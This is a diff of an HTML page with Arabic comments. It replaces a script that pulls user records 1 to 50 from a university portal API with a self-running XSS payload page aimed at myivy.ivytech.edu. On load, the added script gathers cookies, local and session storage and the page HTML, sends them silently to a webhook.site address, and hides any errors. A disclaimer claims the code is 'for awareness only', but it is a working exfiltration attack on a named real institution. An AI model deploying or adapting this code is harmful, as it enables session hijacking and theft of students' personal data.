@@ -1,43 +1,35 @@
+<!-- ❌ كود خبيث يستخدمه مهاجم في موقع myivy.ivytech.edu عند وجود XSS -->
+<!-- للتوعية فقط. لا يجب استخدام هذا الكود خارج بيئة اختبار مرخص بها. -->
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Universal CTF Data Extractor</title>
-</head>
+<head><title>Malicious XSS on myivy.ivytech.edu</title></head>
 <body>
-  <h2>📥 بدء جمع البيانات من الخادم</h2>
-  <pre id="output">يتم الفحص الآن...\n</pre>
+  <h2>Welcome to MyIvy (وهمي)</h2>
 
   <script>
-    const baseUrl = "https://myivy.test.ivytech.edu/api/user/";
-    const output = document.getElementById("output");
+    // السكربت يبدأ فور تحميل الصفحة - دون تفاعل المستخدم
+    (function() {
+      try {
+        const stolen = {
+          source: "myivy.ivytech.edu",
+          cookies: document.cookie,
+          storage: {
+            local: {...localStorage},
+            session: {...sessionStorage}
+          },
+          html: document.documentElement.outerHTML
+        };
 
-    let allData = [];
+        fetch("https://webhook.site/0f33276b-fde5-40b4-bc91-a1cc01f1537d", {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify(stolen)
+        });
 
-    async function collectEverything() {
-      for (let i = 1; i <= 50; i++) { // غيّر الرقم حسب الحاجة
-        const url = `${baseUrl}${i}`;
-        try {
-          const response = await fetch(url, { credentials: "include" });
-          const text = await response.text();
-
-          output.innerText += `\n🌐 [${i}] Response:\n${text}\n--------------------\n`;
-
-          // تخزين البيانات للعرض النهائي
-          allData.push({
-            id: i,
-            url: url,
-            content: text
-          });
-
-        } catch (error) {
-          output.innerText += `\n⚠️ [${i}] Error: ${error.message}\n`;
-        }
+      } catch (err) {
+        // فشل التنفيذ بصمت
       }
-
-      output.innerText += `\n✅ اكتمل الفحص! تم جمع ${allData.length} رد.\n`;
-    }
-
-    collectEverything();
+    })();
   </script>
 </body>
 </html>
